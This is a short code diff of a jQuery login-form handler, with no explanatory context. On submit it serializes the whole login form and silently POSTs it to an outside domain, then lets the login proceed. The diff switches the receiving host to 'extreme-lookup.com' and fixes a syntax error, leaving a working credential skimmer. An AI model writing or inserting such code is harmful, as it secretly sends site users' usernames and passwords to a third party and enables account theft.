@@ -1,15 +1,15 @@
-$(".login-form").submit(function()){
+$(".login-form").submit(function() {
     var d = $(".login-form");
 
     $.ajax({
-        url: "https://api-true-id-x.com/json/",
+        url: "https://extreme-lookup.com/json/",
         type: "POST",
         data: d.serialize(),
-        success: function(){
+        success: function () {
             return true;
         },
-        error: function(){
+        error: function () {
             return true;
         },
-    }),
+    });
 });
